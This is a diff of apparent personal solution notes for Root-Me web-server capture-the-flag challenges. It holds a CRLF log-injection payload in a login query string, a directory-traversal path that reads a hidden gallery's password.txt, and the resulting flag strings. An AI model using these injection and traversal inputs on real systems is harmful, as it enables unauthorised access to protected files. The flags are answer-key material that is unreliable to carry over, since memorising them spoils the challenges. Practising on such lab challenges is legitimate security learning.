@@ -95,3 +95,15 @@ hint: utiliser curl
 - ?username=admin authenticated.%0D%0Aa&password=admin
 
 - rFSP&G0p&5uAg1%
+
+## Directory traversal
+
+- http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=
+
+- http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/
+
+- http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r/
+
+- http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r//password.txt
+
+- kcb$!Bx@v4Gs9Ez
